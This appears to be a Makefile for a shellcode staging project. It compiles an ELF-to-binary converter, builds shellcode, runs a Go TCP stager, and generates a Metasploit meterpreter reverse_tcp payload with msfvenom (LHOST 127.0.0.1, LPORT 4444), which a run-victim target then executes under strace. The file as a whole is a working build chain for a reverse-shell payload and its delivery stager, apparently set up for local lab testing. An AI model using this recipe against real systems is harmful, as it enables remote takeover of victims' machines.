LHOST=127.0.0.1

CC=gcc

.PHONY: elf2bin shellcode.elf victim.elf

all: convert2bin victim.elf
all: tcp-stager

elf2bin:
	$(CC) -o elf2bin elf2bin-src/elf2bin.c elf2bin-src/elf.h  elf2bin-src/util-common.h

shellcode.elf:
	cd ./example && make && mv ./shellcode.elf ../
	file shellcode.elf 

convert2bin: elf2bin shellcode.elf
	./elf2bin shellcode.elf shellcode.elf.bin
	mv shellcode.elf.bin shellcode.elf

tcp-stager:
	clear
	go run main.go

regenerate:
	python ./victim/craft.py 126

victim.elf:
	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o victim.elf && chmod +x victim.elf
	# cd ./victim && make && mv ./victim.elf ../
	# file victim.elf

run-victim: victim.elf
	strace ./victim.elf